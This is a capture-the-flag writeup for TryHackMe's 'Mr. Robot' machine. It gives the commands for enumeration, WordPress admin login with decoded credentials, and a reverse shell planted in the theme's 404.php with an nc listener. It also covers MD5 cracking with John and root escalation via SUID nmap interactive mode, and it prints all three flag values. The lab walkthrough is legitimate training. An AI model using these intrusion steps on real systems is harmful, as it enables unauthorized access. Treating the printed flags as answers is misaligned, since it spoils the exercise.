# 🤖 Mr. Robot CTF — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20WordPress%20%7C%20Reverse%20Shell%20%7C%20Privesc-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Pwned-red?style=flat-square)
![Author](https://img.shields.io/badge/Author-Obada%20Hamed-181717?style=flat-square)

> *A tribute to the Mr. Robot series — think like Elliot Alderson. Enumerate, exploit, escalate, and find all 3 keys.*

---

## 🗺️ Attack Path

```
Nmap → Gobuster → robots.txt (Key 1) → /license (Base64 creds)
→ WordPress Admin → Reverse Shell (404.php) → Hash Crack → SSH
→ SUID Nmap → Root Shell (Key 3)
```

---

## 1. Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oA nmap_output <target-ip>
```

| Port | Service |
|------|---------|
| 22 | SSH (closed) |
| 80 | HTTP (Apache) |
| 443 | HTTPS (Apache) |

Added to `/etc/hosts`:
```
<target-ip>   mrrobot.thm
```

### Directory Enumeration

```bash
gobuster dir -u http://mrrobot.thm \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -t 100 -q -o gobuster_output.txt
```

**Key findings:**

| Path | Notes |
|------|-------|
| `/robots` | Contains key-1 path + wordlist |
| `/key-1-of-3.txt` | 🔑 Key 1 |
| `/fsocity.dic` | Custom wordlist |
| `/license` | Hidden credentials (Base64) |
| `/wp-login` | WordPress login |

---

## 2. Key 1

```
http://mrrobot.thm/key-1-of-3.txt
```

```
🔑 Key 1: 073403c8a58a1f80d943455fb30724b9
```

---

## 3. Credential Discovery

### /license (Base64)

The `/license` page contained:
```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decoded:
```bash
echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
# elliot:ER28-0652
```

---

## 4. WordPress Exploitation

Login at `http://mrrobot.thm/wp-login.php`:
```
Username: elliot
Password: ER28-0652
```

### Reverse Shell via Theme Editor

`Appearance → Editor → 404.php`

Replaced content with [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), setting:
- `LHOST` = attacker IP
- `LPORT` = chosen port

```bash
# Listener
nc -lvnp <PORT>

# Trigger
curl http://mrrobot.thm/wp-content/themes/twentyfifteen/404.php
```

✅ Reverse shell obtained.

Shell upgrade:
```bash
SHELL=/bin/bash script -q /dev/null
```

---

## 5. Key 2

```bash
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracking with John:
```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: abcdefghijklmnopqrstuvwxyz
```

```bash
su robot
cat /home/robot/key-2-of-3.txt
```

```
🔑 Key 2: 822c73956184f694993bede3eb39f959
```

---

## 6. Privilege Escalation — SUID Nmap

```bash
find / -perm -4000 2>/dev/null
# /usr/local/bin/nmap  ← vulnerable version
```

Nmap interactive mode exploit:
```bash
nmap --interactive
!sh
```

✅ Root shell obtained.

---

## 7. Key 3

```bash
cat /root/key-3-of-3.txt
```

```
🔑 Key 3: 04787ddef27c3dee1ee161b21670b4e4
```

---

## 📋 All Keys

| Key | Value |
|-----|-------|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bede3eb39f959` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

---

## 📋 Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | Port + directory scanning | Nmap, Gobuster |
| Credential Discovery | Base64 decode in /license | CyberChef |
| Initial Access | WordPress theme editor RCE | Burp Suite, nc |
| Lateral Movement | MD5 hash cracking | John the Ripper |
| Privilege Escalation | SUID nmap interactive mode | GTFOBins |

> **Key lesson:** Always enumerate everything — `/license` and `/robots.txt` had the keys to the entire machine. WordPress theme editor is a powerful RCE vector when you have admin access.
